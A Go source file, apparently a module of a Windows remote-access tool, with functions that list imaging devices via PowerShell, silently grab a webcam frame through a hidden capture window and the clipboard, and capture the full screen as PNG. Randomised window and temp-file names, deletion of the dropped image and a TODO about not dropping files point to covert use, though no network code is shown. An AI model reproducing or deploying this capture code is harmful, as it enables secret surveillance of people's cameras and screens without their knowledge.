package core

import (
	"bytes"
	"fmt"
	"github.com/AllenDang/w32"
	"image"
	"image/png"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"reflect"
	"unsafe"
)

// Replace WMI package with Powershell command
// powershell Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.PNPClass -Match "Image"} | Select-Object Name

//TODO edit to not drop a file

func TakeWebcamImage() ([]byte, error) {
	output := IssuePowershell("Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.PNPClass -Match \"Image\"} | Select-Object Name")
	if len(output) == 0 {
		return nil, nil
	}
	//fmt.Println(output)
	var name = RandomString(5)
	handle, _, _ := proccapCreateCaptureWindowA.Call(uintptr(unsafe.Pointer(&name)), 0, 0, 0, 1280, 720, 0, 0)
	//if err == nil{
	_, _, _ = procSendMessageA.Call(handle, 1034, 0, 0) //WM_CAP_DRIVER_CONNECT
	_, _, _ = procSendMessageA.Call(handle, 1074, 0, 0) //WM_CAP_SET_PREVIEW
	//time.Sleep(3000 * time.Millisecond) //Added to give time for the Camera to focus and get lighting REMOVED DUE TO MAKING DRIVER HANG?
	_, _, _ = procSendMessageA.Call(handle, 1084, 0, 0) //WM_CAP_GRAB_FRAME
	_, _, _ = procSendMessageA.Call(handle, 1054, 0, 0) //WM_CAP_EDIT_COPY
	_, _, _ = procSendMessageA.Call(handle, 1035, 0, 0) //WM_CAP_DRIVER_DISCONNECT

	f, err := ioutil.TempFile("", RandomString(15))
	if err != nil {
		//fmt.Println("0", err.Error())
		return nil, err
	}
	_ = f.Close()
	_, err = exec.Command("PowerShell", "-Command", "Add-Type", "-AssemblyName", fmt.Sprintf("System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", f.Name())).CombinedOutput()
	if err != nil {
		//fmt.Println("1", err.Error())
		return nil, err
	}
	r := new(bytes.Buffer)
	file, err := os.Open(f.Name())
	if err != nil {
		//fmt.Println("2", err.Error())
		return nil, err
	}
	if _, err := io.Copy(r, file); err != nil {
		//fmt.Println("3", err.Error())
		return nil, err
	}
	_ = file.Close()
	_ = os.Remove(f.Name())

	body, err := ioutil.ReadAll(r)
	if err != nil {
		//fmt.Println("4", err.Error())
		return nil, err
	}

	return body, nil
	//}else{
	//	fmt.Println("CALL: " + err.Error())
	//}
	//	return nil, err
}

func CaptureScreen(compressImage bool) ([]byte, error) {
	r, e := screenRect()
	if e != nil {
		return nil, e
	}
	return captureRect(compressImage, r)
}

func screenRect() (image.Rectangle, error) {
	hDC := w32.GetDC(0)
	if hDC == 0 {
		return image.Rectangle{}, nil
	}
	defer w32.ReleaseDC(0, hDC)
	x := w32.GetDeviceCaps(hDC, w32.HORZRES)
	y := w32.GetDeviceCaps(hDC, w32.VERTRES)
	return image.Rect(0, 0, x, y), nil
}

func captureRect(compressImage bool, rect image.Rectangle) ([]byte, error) {
	hDC := w32.GetDC(0)
	if hDC == 0 {
		return nil, nil
	}
	defer w32.ReleaseDC(0, hDC)

	m_hDC := w32.CreateCompatibleDC(hDC)
	if m_hDC == 0 {
		return nil, nil
	}
	defer w32.DeleteDC(m_hDC)

	x, y := rect.Dx(), rect.Dy()

	bt := w32.BITMAPINFO{}
	bt.BmiHeader.BiSize = uint32(reflect.TypeOf(bt.BmiHeader).Size())
	bt.BmiHeader.BiWidth = int32(x)
	bt.BmiHeader.BiHeight = int32(-y)
	bt.BmiHeader.BiPlanes = 1
	bt.BmiHeader.BiBitCount = 32
	bt.BmiHeader.BiCompression = w32.BI_RGB

	ptr := unsafe.Pointer(uintptr(0))

	m_hBmp := w32.CreateDIBSection(m_hDC, &bt, w32.DIB_RGB_COLORS, &ptr, 0, 0)
	if m_hBmp == 0 {
		return nil, nil
	}
	if m_hBmp == w32.InvalidParameter {
		return nil, nil
	}
	defer w32.DeleteObject(w32.HGDIOBJ(m_hBmp))

	obj := w32.SelectObject(m_hDC, w32.HGDIOBJ(m_hBmp))
	if obj == 0 {
		return nil, nil
	}
	if obj == 0xffffffff { //GDI_ERROR
		return nil, nil
	}
	defer w32.DeleteObject(obj)

	//Note:BitBlt contains bad error handling, we will just assume it works and if it doesn't it will panic :x
	w32.BitBlt(m_hDC, 0, 0, x, y, hDC, rect.Min.X, rect.Min.Y, w32.SRCCOPY)

	var slice []byte
	hdrp := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	hdrp.Data = uintptr(ptr)
	hdrp.Len = x * y * 4
	hdrp.Cap = x * y * 4

	var imageBytes []byte
	var err error
	buf := new(bytes.Buffer)

	if compressImage {
		imageBytes = make([]byte, len(slice)/4)
		j := 0
		for i := 0; i < len(slice); i += 4 {
			imageBytes[j] = slice[i]
			j++
		}
		img := &image.Gray{Pix: imageBytes, Stride: x, Rect: image.Rect(0, 0, x, y)}
		err = png.Encode(buf, img)
	} else {
		imageBytes = make([]byte, len(slice))
		for i := 0; i < len(imageBytes); i += 4 {
			imageBytes[i], imageBytes[i+2], imageBytes[i+1], imageBytes[i+3] = slice[i+2], slice[i], slice[i+1], 255
		}
		img := &image.RGBA{Pix: imageBytes, Stride: 4 * x, Rect: image.Rect(0, 0, x, y)}
		err = png.Encode(buf, img)
	}
	return buf.Bytes(), err
}
